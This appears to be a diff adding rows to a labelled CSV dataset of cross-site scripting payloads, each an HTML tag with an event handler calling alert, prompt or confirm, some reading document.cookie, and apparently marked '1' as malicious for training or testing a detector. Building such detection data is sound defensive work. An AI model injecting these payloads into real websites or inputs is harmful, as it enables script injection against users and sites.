+<img onselect='alert(1)'>,1
+<details oninput=alert(window.location)>,1
+<textarea ondrag='prompt(1)'>,1
+<select/oninput=prompt(1)>,1
+<video ondrop=alert(document.cookie)>,1
+<audio onload=alert(window.location)>,1
+<span/onchange=alert(document.domain)>,1
+"<audio onerror=""confirm(1)"">",1
+<body oninput='confirm(1)'>,1
+"<audio ondblclick=""alert(document.cookie)"">",1
+"<marquee onkeydown=""prompt(1)"">",1
+<select onkeypress='alert(document.domain)'>,1
+<div onkeyup='prompt(1)'>,1
+<body/oninput=confirm(1)>,1
+"<input onerror=""confirm(1)"">",1
+<form oncontextmenu=alert(1)>,1
+<embed/onkeydown=alert(window.location)>,1
+"<embed onblur=""alert(document.domain)"">",1
+<div onselect='confirm(1)'>,1
+<div onload='confirm(1)'>,1
+<img/src=x/onerror=alert(7)>,1
+<marquee onkeypress='alert(document.cookie)'>,1
+"<video onsubmit=""confirm(1)"">",1
+<select ondblclick='alert(document.cookie)'>,1
+<iframe onkeyup=alert(window.location)>,1
+"<img oninput=""alert(document.domain)"">",1
+<svg onload=alert(9)>,1
+<img src=x onerror=alert(5)>,1
+<div/onchange=alert(document.cookie)>,1
+<object onchange=alert(window.location)>,1
+"<span onblur=""alert(1)"">",1
+<body/ondblclick=alert(window.location)>,1
+<select oninput=alert(window.location)>,1
+<img src=x onerror='alert(6)'>,1
+<form onblur=prompt(1)>,1
+<div onblur=prompt(1)>,1
+<iframe onwheel='alert(1)'>,1
+<input onfocus=alert(1)>,1
+"<img onselect=""alert(document.cookie)"">",1
+"<input onwheel=""alert(document.domain)"">",1
+"<select ondrag=""alert(document.domain)"">",1
+<input/onerror=alert(document.domain)>,1
+<textarea onerror='confirm(1)'>,1
+<textarea oninput='confirm(1)'>,1
+"<input onclick=""confirm(1)"">",1
+<audio/onkeydown=alert(window.location)>,1
+<marquee onblur='confirm(1)'>,1
+"<embed ondblclick=""alert(document.domain)"">",1
+<select onkeypress=confirm(1)>,1
+<iframe onmouseover='alert(document.domain)'>,1
+<details ondblclick='confirm(1)'>,1
+<form onload=alert(document.domain)>,1
+"<video onmouseover=""confirm(1)"">",1
+<form oncontextmenu='alert(document.domain)'>,1
+"<span ondblclick=""prompt(1)"">",1
+<object onmouseover=alert(document.cookie)>,1
+<svg/onload=alert(2)>,1
+<button ondrop=alert(window.location)>,1
+<img/src=x/onerror=alert(4)>,1
+<embed onkeydown=alert(window.location)>,1
+<button onselect='alert(document.cookie)'>,1
+<input onkeydown='prompt(1)'>,1
+<object/onchange=alert(window.location)>,1
+<div oncontextmenu='confirm(1)'>,1
+<embed oncontextmenu='alert(window.location)'>,1
+"<object oncontextmenu=""confirm(1)"">",1
+"<input onmouseout=""prompt(1)"">",1
+<iframe onfocus=prompt(1)>,1
+<details/onkeydown=alert(window.location)>,1
+"<div onsubmit=""alert(1)"">",1
+<details onsubmit=alert(1)>,1
+<embed oninput=prompt(1)>,1
+<iframe onmouseover='alert(document.cookie)'>,1
+<object oncontextmenu=confirm(1)>,1
+<span onchange='alert(document.domain)'>,1
+<form onkeypress=alert(document.domain)>,1
+<img onselect=prompt(1)>,1
+"<div onchange=""alert(document.cookie)"">",1
+<embed onchange=alert(document.cookie)>,1
+<select/onfocus=alert(1)>,1
+"<input oncontextmenu=""alert(1)"">",1
+<marquee/ondblclick=alert(1)>,1
+<img/src=x/onerror=alert(2)>,1
+<embed onblur=alert(document.domain)>,1
+"<video onsubmit=""alert(document.domain)"">",1
+<form onblur='prompt(1)'>,1
+"<audio oninput=""alert(window.location)"">",1
+<input onkeydown=confirm(1)>,1
+"<marquee onkeyup=""alert(window.location)"">",1
+<input/onkeydown=confirm(1)>,1
+<audio ondrag='confirm(1)'>,1
+"<embed onkeydown=""alert(window.location)"">",1
+<audio onchange='alert(document.domain)'>,1
+<form oncontextmenu='alert(1)'>,1
+<body/onload=prompt(1)>,1
+<textarea onselect=alert(document.domain)>,1
+<marquee onload='alert(window.location)'>,1
+<form oncontextmenu='alert(window.location)'>,1
+"<iframe onerror=""alert(1)"">",1
+<textarea ondrag=alert(document.domain)>,1
+<iframe onkeyup='alert(window.location)'>,1
+<select/onclick=prompt(1)>,1
+<video onwheel='alert(window.location)'>,1
+<marquee ondrag=alert(window.location)>,1
+<span onkeypress='alert(window.location)'>,1
+<body onsubmit=alert(document.cookie)>,1
+<textarea/ondrag=alert(document.cookie)>,1
+<video onblur=confirm(1)>,1
+<select oninput=alert(1)>,1
+"<details onkeyup=""confirm(1)"">",1
+<object ondblclick=alert(document.cookie)>,1
+<span/onkeypress=alert(window.location)>,1
+<input onkeydown='confirm(1)'>,1
+<span/onfocus=prompt(1)>,1
+<input/oncontextmenu=prompt(1)>,1
+"<iframe ondblclick=""alert(1)"">",1
+<marquee onkeydown='confirm(1)'>,1
+<img/onchange=alert(1)>,1
+"<select oninput=""alert(1)"">",1
+"<textarea onselect=""alert(1)"">",1
+<button/onkeypress=confirm(1)>,1
+<marquee onwheel=alert(window.location)>,1
+"<marquee onchange=""alert(document.domain)"">",1
